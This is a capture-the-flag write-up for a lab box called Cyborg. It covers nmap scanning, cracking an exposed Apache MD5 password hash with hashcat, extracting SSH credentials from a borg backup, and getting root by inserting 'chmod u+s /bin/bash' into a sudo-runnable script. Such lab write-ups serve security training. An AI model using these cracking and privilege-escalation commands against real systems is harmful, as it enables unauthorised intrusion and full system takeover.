# Cyborg

We'll start with our usual nmap-scan:

> `sudo nmap 10.10.196.112 -Pn -p- -A -vv -T4 --script discovery,vuln -oN nmap-scan --min-parallelism 55`

From that we learn:

1. Services:

> `cat nmap-scan | grep -o -e '[0-9]\+/tcp.*'`

- 22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
- 80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))

2. Directories:

> `cat nmap-scan | grep -v nmap | grep -o -e '[[:space:]]\+/[a-zA-Z0-9]\+/.*' | grep -o -e '/[a-zA-Z0-9]\+/.*' | sort | uniq`

- /admin/admin.html: Possible admin folder
- /admin/: Possible admin folder
- /etc/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
- /icons/

3. Credentials:

Under ***/etc/squid/passwd*** we can find the next pair of credentials:

- music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.

Let's identify that hash:

> `name-that-hash --text '$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.'`

Most Likely:
- MD5(APR), HC: 1600 
- Apache MD5, HC: 1600 
- md5apr1, HC: 1600 

That hash camn be easily cracked with hashcat:

> `hashcat --force -m 1600 -a 0 hash.txt ~/CyberSecurity/SecLists/Passwords/Leaked-Databases/rockyou.txt`

The next thing we're gonna look at, is a config file at ***/etc/squid/squid.conf***:

> auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
>
> auth_param basic children 5
> 
> auth_param basic realm Squid Basic Authentication
>
> auth_param basic credentialsttl 2 hours
>
> acl auth_users proxy_auth REQUIRED
>
> http_access allow auth_users

Ok. Moving on to ***/admin/***. We'll see a navbar on top, there's an 'archive'
dropdown. One of the options is 'download'. After clicking on it, you're presented
with a ***archive.tar*** file. Unpack it using the following command:

> `tar -xf archive.tar`

And navigate inside ***/home/field/dev/final_archive*** directory.

After reaading the README file, we find out that we need to install borg:

> `sudo apt install borgbackup`

Do

> `borg list .`

And enter the cracked password for music archive. Seems that we've found a repository.
Let's find out its contents:

> `cd ../../../../`
>
> `mkdir repository`
> 
> `borg mount home/field/dev/final_archive repository`
>
> `repository/music_archive/home/alex`
>
> `tree -L 3 .`

A 'secret.txt' is just a taunt, but in the 'note.txt' we find ssh credentials!
To get 'user.txt', just login to ssh with those.

---

## ***Privilege escalation***

We'll start with finding out, what can we run with sudo:

> `sudo -l`

- (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh

Since alex can edit the file, just add the following line:

> `chmod u+s /bin/bash`

and get a root shell:

> `/bin/bash -p`

Now you can get the flag at /root directory.

### ***Note:***

The -p option in bash is related to security. It is used to prevent the shell 
reading user-controlled files.

The bash manual says:

Invoked with unequal effective and real uid/gids

If Bash is started with the effective user (group) id not equal to the real user (group) 
id, and the -p option is not supplied, no startup files are read, shell functions are 
not inherited from the environment, the SHELLOPTS, BASHOPTS, CDPATH, and GLOBIGNORE 
variables, if they appear in the environment, are ignored, and the effective user id is 
set to the real user id. If the -p option is supplied at invocation, the startup 
behavior is the same, but the effective user id is not reset.
